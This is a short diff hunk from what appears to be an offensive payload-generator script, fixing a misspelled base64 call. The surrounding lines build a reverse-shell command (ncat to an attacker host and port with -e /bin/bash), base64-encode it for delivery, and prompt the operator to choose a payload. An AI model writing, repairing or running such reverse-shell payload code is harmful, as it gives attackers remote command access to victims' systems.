@@ -62,7 +62,7 @@ Advanced payload modules>>>>
 
 """)
 s=f"ncat {lhost} {lport} -e /bin/bash"
-encoded=base64.b64enconde(s.encode("utf-8"))
+encoded=base64.b64encode(s.encode("utf-8"))
 encodeds=encoded.decode("utf-8")
 print("\033[1;35 ")
 payload=input("frsf(choose payload)#> ")
